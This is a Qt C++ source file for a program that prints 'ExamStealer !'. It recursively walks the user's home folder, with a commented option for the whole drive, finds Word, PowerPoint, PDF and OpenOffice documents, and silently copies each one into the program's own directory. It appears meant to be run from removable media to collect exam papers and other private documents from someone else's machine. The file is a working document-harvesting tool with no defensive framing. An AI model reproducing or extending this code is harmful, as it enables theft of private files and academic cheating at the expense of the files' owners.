#include "copy.h"

Copy::Copy(QObject *parent) : QObject(parent)
{

}

void Copy::run()
{
    // Add your main code here


    qDebug() << "ExamStealer !" << endl;
    QElapsedTimer timer;
    timer.start();
    //scanDir(QDir::homePath());//Scan directory in 24396 milliseconds (depend on file amount it can increase)
    _scanDir(QDir::homePath()); //Scan directory in 2998 milliseconds (depend on file amount) (C:\Users\%USERMANE%\)
    //_scanDir(QDir::rootPath()); // (C:\)
    qDebug() << "The operation took " << timer.elapsed() << "milliseconds";
    quit();//Quit
}

void Copy::scanDir(QDir dir)
{
    dir.setNameFilters(QStringList("*.exe") << "*.docx" << ".pdf");
    dir.setFilter(QDir::Files | QDir::NoDotAndDotDot | QDir::NoSymLinks);

    qDebug() << "Scanning: " << dir.path();

    //Parcours
    QFileInfoList fileList = dir.entryInfoList();
    for (int i=0; i<fileList.count(); i++)
    {
        qDebug() << QTime::currentTime().toString() <<"Found file path: " << fileList[i].absoluteFilePath();
        qDebug() << QTime::currentTime().toString() <<"Found file: " << fileList[i].fileName();
    }

    dir.setFilter(QDir::AllDirs | QDir::NoDotAndDotDot | QDir::NoSymLinks);
    QStringList dirList = dir.entryList();
    for (int i=0; i<dirList.size(); ++i)
    {
        QString newPath = QString("%1/%2").arg(dir.absolutePath()).arg(dirList.at(i));
        scanDir(QDir(newPath));
    }
}

void Copy::_scanDir(QString dir){
    //Word - Powerpoint - Pdf Extension - Openoffice
    QDirIterator it(dir, QStringList() << "*.doc"  << "*.docx" "*.docm" << "*.ppt" << "*.pptx" << "*.pptm" << "*.ppsx" << "*.ppsm"  << "*.sldx" << "*.pdf" << "*.odt", QDir::Files | QDir::NoDotAndDotDot | QDir::NoSymLinks, QDirIterator::Subdirectories);

    while (it.hasNext())
    {
        qDebug() << "\nFound file: " << it.next();
        qDebug() << "Dir path: "  << QString(it.path());
        qDebug() << "File name: "  << QString(it.fileName()) << "\n";
        //copyDirToRoot(QString(it.path())); //Copy all dir
        copyFileToRoot(QString(it.filePath()), it.fileName()); //Copy found file

    }
}

bool Copy::copyFileToRoot(QString sourceFilePath, QString fileName)
{
    //App root dir
    QString appDir = QCoreApplication::applicationDirPath() + "/" + fileName;

    //copy_dir_recursive(sourceFile, appDir, true);
    if (QFile::exists(appDir))//Replace if already exist
    {
            if (QFile::remove(appDir) == false)
                return false;
    }

    if(!QFile::copy(sourceFilePath, appDir)){
        qDebug() << "Cant copy file: "  << sourceFilePath <<  "to " << appDir << "\n";
        return false;
    }
    return true;
}

bool Copy::copyDirToRoot(QString sourceDir)
{
    //App root dir
    QString appDir = QCoreApplication::applicationDirPath() + "/";

    if(!copy_dir_recursive(sourceDir, appDir, true)){
        qDebug() << "Cant copy directory: "  << sourceDir <<  "to " << appDir << "\n";
        return false;
    }
    return true;
}



//Taken from https://gzeki.com/blog/view/Recursive_copy_files_from_one_directory_to_another_in_C++_(Qt_5)
bool Copy::copy_dir_recursive(QString from_dir, QString to_dir, bool replace_on_conflit)
{
    qDebug() << "Source path: "  << from_dir << "\n";
    qDebug() << "Destination path: "  << to_dir << "\n";
    QDir dir;
    dir.setPath(from_dir);

    from_dir += QDir::separator();
    to_dir += QDir::separator();

    foreach (QString copy_file, dir.entryList(QDir::Files)) {
        QString from = from_dir + copy_file;
        QString to = to_dir + copy_file;

        if (QFile::exists(to)){
            if (replace_on_conflit){
                if (QFile::remove(to) == false)
                    return false;
            }
            else
                continue;
        }

        if (QFile::copy(from, to) == false)
            return false;
    }

    foreach (QString copy_dir, dir.entryList(QDir::Dirs | QDir::NoDotAndDotDot)){
        QString from = from_dir + copy_dir;
        QString to = to_dir + copy_dir;

        if (dir.mkpath(to) == false)
            return false;

        if (copy_dir_recursive(from, to, replace_on_conflit) == false)
            return false;
    }
    return true;
}



void Copy::quit()
{
    // you can do some cleanup here
    // then do emit finished to signal CoreApplication to quit
    emit finished();
}

/*~Copy(){

}*/
